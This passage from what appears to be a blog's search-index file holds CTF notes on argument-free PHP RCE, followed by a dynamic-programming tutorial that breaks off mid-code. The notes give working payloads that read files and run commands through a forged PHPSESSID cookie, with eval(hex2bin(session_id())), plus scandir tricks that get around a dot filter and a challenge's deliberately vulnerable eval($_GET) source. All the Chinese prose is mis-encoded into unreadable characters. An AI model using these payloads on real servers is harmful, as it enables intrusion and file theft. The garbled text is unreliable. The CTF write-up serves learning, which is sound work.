punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>æŠ“åŒ…ä¼ å…¥Cookie<span class="token punctuation">:</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span><span class="token punctuation">(</span>æƒ³è¯»çš„æ–‡ä»¶<span class="token punctuation">)</span>å³å¯</code></pre><p>RCEï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>æŠ“åŒ…ä¼ å…¥Cookie<span class="token punctuation">:</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('å‘½ä»¤')"</span>çš„åå…­è¿›åˆ¶<span class="token punctuation">)</span></code></pre><p>ä»¥ä¸Šçš„payloadå¥½åƒåªé€‚ç”¨äº<code>php7</code>ä»¥ä¸‹çš„ç‰ˆæœ¬ï¼Œphp7ä»¥ä¸Šçš„ä¸ä¼šæ˜¾ç¤º</p><ul><li><strong>session_start()</strong>ï¼šå¯åŠ¨æ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯ï¼ŒæˆåŠŸå¼€å§‹ä¼šè¯è¿”å› <strong><code>TRUE</code></strong> ï¼Œåä¹‹è¿”å› <strong><code>FALSE</code></strong></li><li><strong>session_id()</strong>ï¼šè·å–/è®¾ç½®å½“å‰ä¼šè¯ IDï¼Œè¿”å›å½“å‰ä¼šè¯IDã€‚ å¦‚æœå½“å‰æ²¡æœ‰ä¼šè¯ï¼Œåˆ™è¿”å›ç©ºå­—ç¬¦ä¸²ï¼ˆâ€â€ï¼‰ã€‚</li></ul><h4 id="Payload5-scandir"><a href="#Payload5-scandir" class="headerlink" title="Payload5-scandir()"></a>Payload5-scandir()</h4><p>æ–‡ä»¶è¯»å–ï¼š</p><pre class="language-php" data-language="php"><code class="language-php">å½“å‰ç›®å½•ï¼š<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ä¸Šçº§ç›®å½•æ–‡ä»¶ï¼š<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li><strong>getcwd()</strong>ï¼šå–å¾—å½“å‰å·¥ä½œç›®å½•ï¼ŒæˆåŠŸåˆ™è¿”å›å½“å‰å·¥ä½œç›®å½•ï¼Œå¤±è´¥è¿”å› <strong><code>FALSE</code></strong>ã€‚</li><li><strong>dirname()</strong>ï¼šè¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ï¼Œè¿”å› path çš„çˆ¶ç›®å½•ã€‚ å¦‚æœåœ¨ <code>path</code> ä¸­æ²¡æœ‰æ–œçº¿ï¼Œåˆ™è¿”å›ä¸€ä¸ªç‚¹ï¼ˆâ€™<em>.</em>â€˜ï¼‰ï¼Œè¡¨ç¤ºå½“å‰ç›®å½•ã€‚å¦åˆ™è¿”å›çš„æ˜¯æŠŠ <code>path</code> ä¸­ç»“å°¾çš„ <code>/component</code>ï¼ˆæœ€åä¸€ä¸ªæ–œçº¿ä»¥åŠåé¢éƒ¨åˆ†ï¼‰å»æ‰ä¹‹åçš„å­—ç¬¦ä¸²(ä¹Ÿå°±æ˜¯ä¸Šçº§ç›®å½•çš„æ–‡ä»¶è·¯å¾„)ã€‚</li><li><strong>chdir()</strong>ï¼šæ”¹å˜ç›®å½•ï¼ŒæˆåŠŸæ—¶è¿”å› <strong><code>TRUE</code></strong>ï¼Œ æˆ–è€…åœ¨å¤±è´¥æ—¶è¿”å› <strong><code>FALSE</code></strong>ã€‚</li><li><strong>scandir()</strong>ï¼šåˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚æˆåŠŸåˆ™è¿”å›åŒ…å«æœ‰æ–‡ä»¶åçš„æ•°ç»„ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å› <strong><code>FALSE</code></strong>ã€‚å¦‚æœ <code>directory</code> ä¸æ˜¯ä¸ªç›®å½•ï¼Œåˆ™è¿”å›å¸ƒå°”å€¼ <strong><code>FALSE</code></strong> å¹¶ç”Ÿæˆä¸€æ¡ <strong><code>E_WARNING</code></strong> çº§çš„é”™è¯¯ã€‚</li><li><strong>array_flip()</strong>ï¼šäº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼ŒæˆåŠŸæ—¶è¿”å›äº¤æ¢åçš„æ•°ç»„ï¼Œå¦‚æœå¤±è´¥è¿”å› <strong><code>NULL</code></strong>ã€‚</li><li><strong>array_rand()</strong>ï¼šä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒï¼Œå¦‚æœåªå–å‡ºä¸€ä¸ª(é»˜è®¤ä¸º1)ï¼Œ<strong>array_rand()</strong> è¿”å›éšæœºå•å…ƒçš„é”®åã€‚ å¦åˆ™å°±è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚ å®Œæˆåï¼Œå°±å¯ä»¥æ ¹æ®éšæœºçš„é”®è·å–æ•°ç»„çš„éšæœºå€¼ã€‚</li></ul><p><strong>array_flip()</strong>å’Œ<strong>array_rand()</strong>é…åˆä½¿ç”¨å¯éšæœºè¿”å›å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶å</p><p><strong>dirname(chdir(dirname()))</strong>é…åˆåˆ‡æ¢æ–‡ä»¶è·¯å¾„</p><h4 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title=".ç»•è¿‡"></a><code>.</code>ç»•è¿‡</h4><h5 id="current-localeconv"><a href="#current-localeconv" class="headerlink" title="current(localeconv())"></a><strong>current(localeconv())</strong></h5><ul><li><strong>localeconv()</strong>ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚è€Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯<code>.</code></li></ul><h5 id="phpversion"><a href="#phpversion" class="headerlink" title="phpversion()"></a><strong>phpversion()</strong></h5><ul><li><code>phpversion()</code>è¿”å›phpç‰ˆæœ¬ï¼Œå¦‚<code>7.3.5</code></li><li><code>floor(phpversion())</code>è¿”å›<code>7</code></li><li><code>sqrt(floor(phpversion()))</code>è¿”å›<code>2.6457513110646</code></li><li><code>tan(floor(sqrt(floor(phpversion()))))</code>è¿”å›<code>-2.1850398632615</code></li><li><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>è¿”å›<code>4.5017381103491</code></li><li><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>è¿”å›<code>45.081318677156</code></li><li><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>è¿”å›<code>46</code></li><li><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>è¿”å›<code>.</code></li><li><code>var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>æ‰«æå½“å‰ç›®å½•</li><li><code>next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>è¿”å›<code>..</code></li></ul><p><strong>floor()</strong>ï¼šèˆå»æ³•å–æ•´ï¼Œ<strong>sqrt()</strong>ï¼šå¹³æ–¹æ ¹ï¼Œ<strong>tan()</strong>ï¼šæ­£åˆ‡å€¼ï¼Œ<strong>cosh()</strong>ï¼šåŒæ›²ä½™å¼¦ï¼Œ<strong>sinh()</strong>ï¼šåŒæ›²æ­£å¼¦ï¼Œ<strong>ceil()</strong>ï¼šè¿›ä¸€æ³•å–æ•´</p><h5 id="crypt"><a href="#crypt" class="headerlink" title="crypt()"></a><strong>crypt()</strong></h5><p><code>chr(ord(hebrevc(crypt(phpversion()))))</code>è¿”å›<code>.</code></p><ul><li><code>hebrevc(crypt(arg))</code>å¯ä»¥éšæœºç”Ÿæˆä¸€ä¸ªhashå€¼ ç¬¬ä¸€ä¸ªå­—ç¬¦éšæœºæ˜¯ $(å¤§æ¦‚ç‡) æˆ–è€… .(å°æ¦‚ç‡) ç„¶åé€šè¿‡ord chråªå–ç¬¬ä¸€ä¸ªå­—ç¬¦</li></ul><p><strong>crypt()</strong>ï¼šå•å‘å­—ç¬¦ä¸²æ•£åˆ—ï¼Œè¿”å›æ•£åˆ—åçš„å­—ç¬¦ä¸²æˆ–ä¸€ä¸ªå°‘äº 13 å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œä»è€Œä¿è¯åœ¨å¤±è´¥æ—¶ä¸ç›å€¼åŒºåˆ†å¼€æ¥ã€‚</p><p><strong>hebrevc()</strong>ï¼šå°†é€»è¾‘é¡ºåºå¸Œä¼¯æ¥æ–‡ï¼ˆlogical-Hebrewï¼‰è½¬æ¢ä¸ºè§†è§‰é¡ºåºå¸Œä¼¯æ¥æ–‡ï¼ˆvisual-Hebrewï¼‰ï¼Œå¹¶ä¸”è½¬æ¢æ¢è¡Œç¬¦ï¼Œè¿”å›è§†è§‰é¡ºåºå­—ç¬¦ä¸²ã€‚</p><h4 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h4><p><strong>current()</strong>çš„åˆ«å<strong>pos()</strong></p><p><strong>readgzfile</strong>å¯ä»¥ä»£æ›¿<strong>readfile</strong></p><p>ç›®å½•æ“ä½œï¼š</p><ul><li><strong>getchwd()</strong> ï¼šå‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚</li><li><strong>scandir()</strong> ï¼šå‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚</li><li><strong>dirname()</strong> ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚</li><li><strong>chdir()</strong> ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚</li></ul><p>æ•°ç»„ç›¸å…³çš„æ“ä½œï¼š</p><ul><li><a href="https://www.w3school.com.cn/php/func_array_end.asp">end()</a> ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_next.asp">next()</a> ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_prev.asp">prev()</a> ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_reset.asp">reset()</a> ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li><a href="https://www.w3school.com.cn/php/func_array_each.asp">each()</a> ï¼š è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨</li></ul><h4 id="æ —å­"><a href="#æ —å­" class="headerlink" title="æ —å­"></a>æ —å­</h4><h5 id="GXYCTF2019â€”ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019â€”ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="GXYCTF2019â€”ç¦æ­¢å¥—å¨ƒ"></a>GXYCTF2019â€”ç¦æ­¢å¥—å¨ƒ</h5><p>æ‰«æç›®å½•<code>.git</code>æºç æ³„éœ²ï¼Œ<code>Githack</code>å¾—åˆ°<code>index</code>æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// echo $_GET['exp'];</span>                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token delimiter important">?></span></span></code></pre><p>payload1ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>payload2ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Cookie<span class="token punctuation">:</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span>flag<span class="token operator">.</span>php</code></pre><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><ul><li><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></li><li><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">https://www.cnblogs.com/wangtanzhi/p/12260986.html</a></li><li><a href="http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html">http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html</a></li><li><a href="https://www.gem-love.com/ctf/530.html?replytocom=5">https://www.gem-love.com/ctf/530.html?replytocom=5</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> CTFé¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    
    
    <entry>
      <title>ç®—æ³•-åŠ¨æ€è§„åˆ’</title>
      <link href="posts/e57c001c/"/>
      <url>posts/e57c001c/</url>
      
        <content type="html"><![CDATA[<h3 id="æ–æ³¢æ‹‰å¥‘æ•°åˆ—"><a href="#æ–æ³¢æ‹‰å¥‘æ•°åˆ—" class="headerlink" title="æ–æ³¢æ‹‰å¥‘æ•°åˆ—"></a>æ–æ³¢æ‹‰å¥‘æ•°åˆ—</h3><p><code>1,1,2,3,5,8,13...</code>ï¼ŒçŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190059738.png" alt loading="lazy"></p><span id="more"></span><h4 id="æš´åŠ›é€’å½’"><a href="#æš´åŠ›é€’å½’" class="headerlink" title="æš´åŠ›é€’å½’"></a><strong>æš´åŠ›é€’å½’</strong></h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">or</span> a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">return</span> main<span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> main<span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre><p>æ—¶é—´å¤æ‚åº¦ä¸º<code>O(2^n)</code>ï¼Œæœ‰å¦‚ä¸‹é€’å½’æ ‘ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190828749.png" alt loading="lazy"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è®¸å¤šçš„è®¡ç®—éƒ½é‡å¤äº†ï¼Œä¾‹å¦‚ä¸‹é¢çš„<code>f(18)</code>ç­‰ï¼Œé‚£ä¹ˆå¦‚ä½•é¿å…è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿæœ‰æ•ˆçš„æ–¹æ³•å°±æ˜¯å°†ç¬¬ä¸€æ¬¡è®¡ç®—å‡ºçš„<code>f(18)</code>çš„ç»“æœä¿ç•™ä¸‹æ¥ï¼Œå¦‚æœä¸‹æ¬¡å†è®¡ç®—åˆ°è¿™ä¸ª<code>f(18)</code>çš„æ—¶å€™ç›´æ¥å°†ç»“æœå–å‡ºæ¥å³å¯ï¼Œç®€ç§°å¤‡å¿˜å½•æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š</p><h4 id="å¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•"><a href="#å¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•" class="headerlink" title="å¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•"></a><strong>å¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•</strong></h4><pre class="language-python" data-language="python"><code class="language-python">memo <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">or</span> a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">if</span> a <span class="token keyword">in</span> memo<span class="token punctuation">:</span>        <span class="token keyword">return</span> memo<span class="token punctuation">[</span>a<span class="token punctuation">]</span>    memo<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> main<span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> main<span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> main<span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> main<span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre><h4 id="DP-tableè§£æ³•"><a href="#DP-tableè§£æ³•" class="headerlink" title="DP tableè§£æ³•"></a><strong>DP tableè§£æ³•</strong></h4><p>è‡ªåº•å‘ä¸Šä¼˜åŒ–</p><pre class="language-python" data-language="python"><code class="language-python">dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">or</span> a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>        dp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span></code></pre><p>åŸç†å›¾å¦‚ä¸‹(emmmmmï¼Œå›¾æ˜¯æ¬è¿è¿‡æ¥çš„ï¼Œæ‰€ä»¥å‰é¢çš„ç¬¬0ä½è¿˜æ˜¯ç”¨åˆ°äº†çš„ï¼Œå¾€å‰ç§»ä¸€ä½å°±è¡Œäº†)</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190143099.png" alt loading="lazy"></p><h4 id="ä¼˜åŒ–"><a href="#ä¼˜åŒ–" class="headerlink" title="ä¼˜åŒ–"></a>ä¼˜åŒ–</h4><p>å†è¿›è¡Œç©ºé—´å¤æ‚åº¦çš„ä¼˜åŒ–</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">or</span> a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    prev <span class="token operator">=</span> <span class="token number">1</span>    curr <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        num <span class="token operator">=</span> prev <span class="token operator">+</span> curr        prev <span class="token operator">=</span> curr        curr <span class="token operator">=</span> num    <span class="token keyword">return</span> curr</code></pre><p>ç”±åŸæ¥çš„æ—¶é—´å¤æ‚åº¦<code>O(2^n)</code>å˜ä¸ºäº†<code>O(n)</code>ï¼Œç©ºé—´å¤æ‚åº¦é™ä¸º<code>O(1)</code></p><h3 id="å‡‘é›¶é’±é—®é¢˜"><a href="#å‡‘é›¶é’±é—®é¢˜" class="headerlink" title="å‡‘é›¶é’±é—®é¢˜"></a>å‡‘é›¶é’±é—®é¢˜</h3><p>å‡è®¾ç»™ä½ <code>k</code>ä¸­é¢å€¼çš„ç¡¬å¸ï¼Œé¢å€¼åˆ†åˆ«ä¸º<code>c1ï¼Œc2ï¼Œc3 ... ck</code>ï¼Œæ¯ç§ç¡¬å¸çš„æ•°é‡æ— é™ï¼Œå†ç»™ä¸€ä¸ªæ€»é‡‘é¢<code>amount</code>ï¼Œé—®<strong>æœ€å°‘</strong>éœ€è¦å‡ æšç¡¬å¸å‡‘å‡ºè¿™ä¸ªé‡‘é¢ï¼Œå¦‚æœä¸å¯èƒ½å‡‘å‡ºï¼Œåˆ™è¿”å›-1</p><p>çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421185311310.png" alt loading="lazy"></p><h4 id="æš´åŠ›é€’å½’-1"><a href="#æš´åŠ›é€’å½’-1" class="headerlink" title="æš´åŠ›é€’å½’"></a><strong>æš´åŠ›é€’å½’</strong></h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">coinChange</span><span class="token punctuation">(</span>coins<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># å½“n - coin = 0 çš„æ—¶å€™è¯´æ˜è¿™æ¡è·¯èµ°çš„é€š</span>            <span class="token keyword">return</span> <span class="token number">0</span>        <span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># å½“n - coin &lt; 0 çš„æ—¶å€™åˆ™è¯´æ˜è¿™æ¡è·¯èµ°ä¸é€š</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>        res <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span>  <span class="token comment"># float("IN</span><span class="token string-interpolation"><span class="token string">F")ä¸ºæ­£æ— ç©·å¤§ï¼Œè´Ÿæ— ç©·å¤§åˆ™ä¸ºfloat("</span></span><span class="token operator">-</span>INF"<span class="token punctuation">)</span>        <span class="token keyword">for</span> coin <span class="token keyword">in</span> coins<span class="token punctuation">:</span>  <span class="token comment"># é€’å½’åˆ—è¡¨</span>            sub <span class="token operator">=</span> main<span class="token punctuation">(</span>n <span class="token operator">-</span> coin<span class="token punctuation">)</span>  <span class="token comment"># å–å‡ºä¸€ä¸ªå€¼nå°±è¦å‡å»é‚£ä¸ªå€¼</span>            <span class="token 